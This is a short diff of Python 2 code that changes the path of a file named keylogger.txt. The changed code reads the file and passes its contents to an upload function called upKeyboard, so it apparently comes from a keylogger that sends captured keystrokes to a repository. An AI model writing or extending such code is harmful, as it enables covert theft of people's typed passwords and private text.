@@ -47,7 +47,7 @@ def run(m):
     fileHandel = None
     
     print "write"
-    fileHandle=open ("C:/pyworks/before/keylogger.txt", 'r' )
+    fileHandle=open ("C:/temp/keylogger.txt", 'r' )
     msg = fileHandle.read()
     upKeyboard(repo,msg,m)
     fileHandle.close()
